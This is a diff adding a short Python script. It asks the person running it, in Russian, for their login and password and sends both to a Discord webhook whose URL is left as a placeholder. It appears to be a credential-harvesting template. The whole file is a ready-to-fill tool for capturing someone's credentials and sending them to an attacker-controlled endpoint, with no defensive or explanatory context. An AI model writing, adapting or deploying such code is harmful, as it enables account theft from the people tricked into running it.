@@ -1,0 +1,21 @@
+from discord import Webhook, AsyncWebhookAdapter
+import asyncio
+import aiohttp
+
+l = [input("ваш логин:")]
+p = [input("ваш пароль:")]
+
+loginfull = l + p
+
+
+async def send () :
+    URL = ('ВАШ URL ВЕБХУКА')
+    Message = loginfull
+
+    async with aiohttp.ClientSession() as session:
+        webhook = Webhook.from_url(URL, adapter=AsyncWebhookAdapter(session))
+        await webhook.send(Message)
+
+
+asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+asyncio.run(send())
